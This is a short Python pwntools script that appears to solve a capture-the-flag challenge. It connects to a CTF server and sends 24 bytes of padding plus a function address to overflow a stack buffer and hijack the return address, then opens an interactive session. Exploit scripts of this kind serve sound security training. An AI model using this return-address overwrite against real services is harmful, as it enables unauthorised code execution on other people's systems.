from pwn import *

# r = process("./helloctf_again")
r = remote("ctf.adl.tw", 11002)

r.recv()
sleep(0.1)
junk = 'a'*24
show_me_magic = 0x0000000000400628
payload = junk + p64(show_me_magic)
r.sendline(payload)

r.interactive()
